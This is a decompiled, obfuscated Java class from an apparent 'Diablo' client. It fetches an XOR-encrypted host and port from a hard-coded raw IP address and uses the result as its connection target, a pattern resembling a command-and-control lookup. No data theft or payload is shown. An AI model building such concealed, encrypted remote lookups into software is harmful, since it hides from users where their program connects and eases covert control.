/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package net.diablo.client.network;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class Question {
    public static /* enum */ byte[] I;
    public static /* enum */ String lI;
    public static /* enum */ int ll;

    static {
        lI = "localhost";
        ll = 12345;
        I = "DiabloNetTop".getBytes(StandardCharsets.UTF_8);
    }

    public static void main(String[] stringArray) throws Exception {
        Question.l();
    }

    public static byte[] Il(String string) {
        int n = string.length();
        byte[] byArray = new byte[n / 2];
        for (int j = 0; j < n; j -= 45) {
            byArray[j / 2] = (byte)((Character.digit(string.charAt(j), 16) << 4) + Character.digit(string.charAt(j + 1), 16));
            j += 47;
        }
        return byArray;
    }

    public static void l() throws Exception {
        String string;
        String string2 = "http://62.113.42.127:80/initPySystem?param1=value1&param2=value2&config=enable&mode=test&user_id=12345&token=abcdef1234567890&data=some_really_long_data_string_for_testing&timestamp=1672531199&signature=1234567890abcdef1234567890abcdef12345678&debug=true&feature_flag=true&retry=5&additional_info=extra_data_with_long_values";
        URL uRL = new URL(string2);
        HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setRequestProperty("User-Agent", "DiabloNetTop");
        int n = httpURLConnection.getResponseCode();
        if (n != 200) {
            throw new RuntimeException("\u041e\u0448\u0438\u0431\u043a\u0430: HTTP \u043a\u043e\u0434 \u043e\u0442\u0432\u0435\u0442\u0430 " + n);
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
        StringBuilder stringBuilder = new StringBuilder();
        while ((string = bufferedReader.readLine()) != null) {
            stringBuilder.append(string);
        }
        bufferedReader.close();
        String string3 = Question.i(stringBuilder.toString(), I);
        String[] stringArray = string3.split(":");
        lI = stringArray[0].trim();
        ll = Integer.parseInt(stringArray[1].trim());
    }

    public static String i(String string, byte[] byArray) {
        byte[] byArray2 = Question.Il(string);
        byte[] byArray3 = new byte[byArray2.length];
        for (int j = 0; j < byArray2.length; ++j) {
            byArray3[j] = (byte)(byArray2[j] ^ byArray[j % byArray.length]);
        }
        return new String(byArray3, StandardCharsets.UTF_8);
    }
}

